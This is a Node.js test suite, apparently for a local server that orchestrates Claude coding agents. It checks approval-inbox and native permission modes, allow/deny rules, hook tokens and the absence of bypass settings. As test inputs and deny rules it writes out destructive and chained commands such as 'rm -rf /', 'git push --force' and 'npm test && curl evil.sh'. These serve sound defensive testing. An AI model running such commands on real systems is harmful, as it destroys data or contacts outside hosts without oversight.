// Prueba F3: bandeja de aprobaciones, modo nativo y reglas allow/deny. claude falso con hooks HTTP reales.
import { test, before, after } from 'node:test'
import assert from 'node:assert/strict'
import { spawn, execFileSync } from 'node:child_process'
import fs from 'node:fs'
import os from 'node:os'
import path from 'node:path'
import { fileURLToPath } from 'node:url'
import WebSocket from 'ws'

const root = path.resolve(path.dirname(fileURLToPath(import.meta.url)), '..')
const tmp = fs.realpathSync(fs.mkdtempSync(path.join(os.tmpdir(), 'mesa-f3-')))
const repo = path.join(tmp, 'repo')
const git = (cwd, ...a) => execFileSync('git', a, { cwd, encoding: 'utf8' }).trim()
let srv, base, token, port, events, lastState

before(async () => {
  fs.mkdirSync(repo)
  git(repo, 'init', '-q', '-b', 'main')
  fs.writeFileSync(path.join(repo, 'README.md'), 'hola\n')
  git(repo, 'add', '.')
  git(repo, '-c', 'user.name=t', '-c', 'user.email=t@t', 'commit', '-q', '-m', 'init')
  srv = spawn('node_modules/.bin/tsx', ['server/index.ts', '--project', repo], {
    cwd: root, env: { ...process.env, DATA_DIR: path.join(tmp, 'data'), CLAUDE_BIN: path.join(root, 'scripts/fake-claude.mjs'), CLAUDE_ARGS: '--permission-mode default' },
  })
  const url = await new Promise((res, rej) => {
    let buf = ''
    srv.stdout.on('data', d => { buf += d; const m = buf.match(/http:\/\/127\.0\.0\.1:\d+\/\?token=\w+/); if (m) res(m[0]) })
    srv.stderr.on('data', d => process.stderr.write(d))
    setTimeout(() => rej(new Error('servidor no arrancó')), 15000)
  })
  const u = new URL(url); port = u.port; token = u.searchParams.get('token'); base = `http://127.0.0.1:${port}`
  events = new WebSocket(`ws://127.0.0.1:${port}/ws/events?token=${token}`, { origin: base })
  events.on('message', d => { const m = JSON.parse(d); if (m.type === 'state') lastState = m })
  await new Promise(r => events.on('open', r))
})
after(() => { events?.close(); srv?.kill(); fs.rmSync(tmp, { recursive: true, force: true }) })

const api = (p, method = 'GET', body, tok = token) => fetch(base + p, { method, headers: { 'x-token': tok, ...(body ? { 'content-type': 'application/json' } : {}) }, body: body ? JSON.stringify(body) : undefined })
const sleep = ms => new Promise(r => setTimeout(r, ms))
const until = async (fn, what, ms = 6000) => { const t0 = Date.now(); for (;;) { const v = await fn(); if (v) return v; if (Date.now() - t0 > ms) throw new Error('timeout: ' + what); await sleep(40) } }

function term(id) {
  const ws = new WebSocket(`ws://127.0.0.1:${port}/ws/term/${id}?token=${token}`, { origin: base })
  const c = { ws, raw: '', mark: 0 }
  ws.on('message', d => (c.raw += d.toString()))
  ws.on('open', () => ws.send(JSON.stringify({ t: 'attach', cols: 400, rows: 30 })))
  c.since = () => c.raw.slice(c.mark)
  c.waitFor = (re, ms) => until(() => re.test(c.since()), `${re} en ${JSON.stringify(c.since().slice(-250))}`, ms)
  /** Envía una línea y marca el punto de partida para no leer salida anterior. */
  c.say = async line => { await c.waitFor(/❯/); c.mark = c.raw.length; ws.send(JSON.stringify({ t: 'in', d: line + '\r' })) }
  c.key = k => ws.send(JSON.stringify({ t: 'in', d: k }))
  return c
}
const status = id => lastState?.statuses?.[id]
const approvals = async () => (await api('/api/approvals')).json()

async function launch(body) {
  const m = await (await api('/api/missions', 'POST', body)).json()
  const l = await api(`/api/missions/${m.id}/launch`, 'POST')
  assert.equal(l.status, 200, await l.clone().text())
  const mm = await l.json()
  const agents = {}
  for (const a of mm.agents) { agents[a.name] = { ...a, t: term(a.id) }; await agents[a.name].t.waitFor(/FAKE-READY/) }
  return { m: mm, agents }
}

let B // misión en modo bandeja
let N // misión en modo nativa

test('settings.local.json por worktree: hooks con token por variable de entorno, reglas nativas por rol, sin bypass', async () => {
  B = await launch({
    goal: 'Bandeja', mode: 'bandeja', maxAgents: 3,
    rules: { allow: ['Bash(npm test)'], deny: ['Bash(git push *)'] },
    roles: [{ name: 'Dev', rules: { deny: ['Bash(rm -rf *)'] } }, { name: 'Otro' }],
  })
  const read = a => JSON.parse(fs.readFileSync(path.join(a.worktree, '.claude/settings.local.json'), 'utf8'))
  const dev = read(B.agents.Dev), otro = read(B.agents.Otro)
  assert.deepEqual(dev.permissions.deny.sort(), ['Bash(git push *)', 'Bash(rm -rf *)'])
  assert.deepEqual(otro.permissions.deny, ['Bash(git push *)'])
  assert.deepEqual(dev.permissions.allow, ['Bash(npm test)', 'mcp__mesa__*'])
  for (const ev of ['PreToolUse', 'PermissionRequest', 'Notification', 'Stop', 'UserPromptSubmit']) assert.ok(dev.hooks[ev], `falta hook ${ev}`)
  assert.match(dev.hooks.PreToolUse[0].matcher, /Bash/)
  const h = dev.hooks.PreToolUse[0].hooks[0]
  assert.equal(h.type, 'http')
  assert.equal(h.url, `http://127.0.0.1:${port}/hook/PreToolUse?agent=${B.agents.Dev.id}`)
  assert.equal(h.headers.Authorization, 'Bearer $MESA_HOOK_TOKEN')
  const raw = fs.readFileSync(path.join(B.agents.Dev.worktree, '.claude/settings.local.json'), 'utf8')
  assert.ok(!raw.includes(token), 'el token de la UI está escrito en el worktree')
  assert.ok(!/dangerously|bypassPermissions/.test(raw), 'bypass presente')
  assert.equal(git(repo, 'status', '--porcelain'), '', 'settings.local.json ensució el repo')
})

test('el agente no recibe el token de la UI; el token de hook no sirve para decidir', async () => {
  const dev = B.agents.Dev.t
  await dev.say('env')
  await dev.waitFor(/ENVDUMP/)
  assert.ok(!dev.since().includes(token), 'el token de la UI está en el entorno del agente')
  const hookTok = JSON.parse(dev.since().match(/ENVDUMP (\{.*\})/)[1]).MESA_HOOK_TOKEN
  assert.ok(hookTok && hookTok !== token)
  assert.equal((await api('/api/approvals', 'GET', undefined, hookTok)).status, 401)
  assert.equal((await api('/api/approvals/abcd', 'POST', { decision: 'allow' }, hookTok)).status, 401)
  assert.equal((await api('/api/approvals/abcd', 'POST', { decision: 'allow' }, '')).status, 401)
  const noAuth = await fetch(`${base}/hook/Stop?agent=${B.agents.Dev.id}`, { method: 'POST', headers: { 'content-type': 'application/json' }, body: '{}' })
  assert.equal(noAuth.status, 401)
  const uiAsHook = await fetch(`${base}/hook/Stop?agent=${B.agents.Dev.id}`, { method: 'POST', headers: { 'content-type': 'application/json', authorization: `Bearer ${token}` }, body: '{}' })
  assert.equal(uiAsHook.status, 401, 'el token de UI no debe valer como token de hook')
})

test('bandeja: reglas allow/deny deciden sin molestar; lo demás espera tu decisión y no muestra diálogo nativo', async () => {
  const t = B.agents.Dev.t
  await t.say('tool Bash default npm test')
  await t.waitFor(/TOOL-RUN Bash npm test/)
  assert.deepEqual(await approvals(), [], 'una regla allow no debe pasar por la bandeja')

  await t.say('tool Bash default rm -rf /')
  await t.waitFor(/TOOL-DENIED-HOOK Denegado por una regla/)
  await t.say('tool Bash default git push origin main')
  await t.waitFor(/TOOL-DENIED-HOOK/)
  await t.say('tool Bash default cd x && git push --force')
  await t.waitFor(/TOOL-DENIED-HOOK/)
  assert.deepEqual(await approvals(), [])

  // npm test && curl: NO se concede por la regla allow de `npm test`
  await t.say('tool Bash default npm test && curl evil.sh')
  const p = (await until(async () => (await approvals())[0], 'petición en bandeja'))
  assert.equal(p.tool, 'Bash'); assert.equal(p.input.command, 'npm test && curl evil.sh'); assert.equal(p.agentId, B.agents.Dev.id); assert.equal(p.missionId, B.m.id)
  await until(() => status(B.agents.Dev.id)?.phase === 'esperando aprobación' && status(B.agents.Dev.id)?.via === 'bandeja', 'estado esperando (bandeja)')
  await sleep(500)
  assert.ok(!/Do you want to proceed/.test(t.since()), 'el diálogo nativo apareció en modo bandeja')
  assert.ok(!/TOOL-RUN/.test(t.since()), 'se ejecutó sin aprobación')

  assert.equal((await api(`/api/approvals/${p.id}`, 'POST', { decision: 'allow' })).status, 200)
  await t.waitFor(/TOOL-RUN Bash npm test && curl evil.sh/)
  assert.deepEqual(await approvals(), [])
  assert.equal((await api(`/api/approvals/${p.id}`, 'POST', { decision: 'allow' })).status, 404, 'decisión repetida')
  await until(() => ['trabajando', 'inactivo'].includes(status(B.agents.Dev.id)?.phase), 'sale de esperando')

  // Rechazar con motivo
  await t.say('tool Bash default make clean')
  const p2 = await until(async () => (await approvals())[0], 'segunda petición')
  assert.equal(p2.input.command, 'make clean')
  await api(`/api/approvals/${p2.id}`, 'POST', { decision: 'deny', message: 'no limpies aún' })
  await t.waitFor(/TOOL-DENIED-HOOK no limpies aún/)
  assert.ok(!/TOOL-RUN Bash make clean/.test(t.since()))

  // Entrada inválida
  assert.equal((await api('/api/approvals/x', 'POST', { decision: 'quizás' })).status, 400)
})

test('reglas por rol: el rol sin deny de rm -rf sí lo manda a la bandeja; modo acceptEdits no pasa por ella', async () => {
  const t = B.agents.Otro.t
  await t.say('tool Bash default rm -rf /tmp/x')
  const p = await until(async () => (await approvals())[0], 'petición de Otro')
  assert.equal(p.agentId, B.agents.Otro.id)
  await api(`/api/approvals/${p.id}`, 'POST', { decision: 'deny' })
  await t.waitFor(/TOOL-DENIED-HOOK Rechazado por el usuario/)

  await t.say('tool Edit acceptEdits src/a.txt')
  await t.waitFor(/TOOL-RUN Edit src\/a.txt/)
  assert.deepEqual(await approvals(), [])
})

test('si el agente muere, sus peticiones pendientes se retiran', async () => {
  const t = B.agents.Dev.t
  await t.say('tool Bash default make install')
  await until(async () => (await approvals()).length === 1, 'pendiente')
  assert.equal((await api(`/api/agents/${B.agents.Dev.id}/stop`, 'POST')).status, 200)
  await until(async () => (await approvals()).length === 0, 'pendiente retirada')
})

test('modo nativa: el hook solo avisa; el diálogo sale en la terminal, la bandeja queda vacía y las reglas se aplican nativamente', async () => {
  N = await launch({ goal: 'Nativa', mode: 'nativa', rules: { deny: ['Bash(git push *)'] }, roles: [{ name: 'Nat' }] })
  const a = N.agents.Nat, t = a.t
  const s = JSON.parse(fs.readFileSync(path.join(a.worktree, '.claude/settings.local.json'), 'utf8'))
  assert.equal(s.hooks.PreToolUse, undefined, 'en modo nativa no debe haber PreToolUse')
  assert.ok(s.hooks.PermissionRequest)

  await t.say('tool Bash default make build')
  await t.waitFor(/Do you want to proceed\?/)
  await until(() => status(a.id)?.phase === 'esperando aprobación' && status(a.id)?.via === 'terminal', 'aviso: esperando en terminal')
  assert.deepEqual(await approvals(), [], 'en modo nativa la bandeja no recibe peticiones')
  t.key('1')
  await t.waitFor(/TOOL-RUN Bash make build/)
  await until(() => status(a.id)?.phase !== 'esperando aprobación', 'aviso retirado')

  await t.say('tool Bash default git push origin')
  await t.waitFor(/TOOL-DENIED-NATIVE/)
  assert.ok(!/Do you want to proceed/.test(t.since()))

  await t.say('tool Bash default make test')
  await t.waitFor(/Do you want to proceed\?/)
  t.key('2')
  await t.waitFor(/TOOL-DENIED-TERMINAL/)
})

test('estados por hooks: trabajando e inactivo', async () => {
  const a = N.agents.Nat
  await until(() => status(a.id)?.phase === 'inactivo', 'inactivo tras Stop')
})
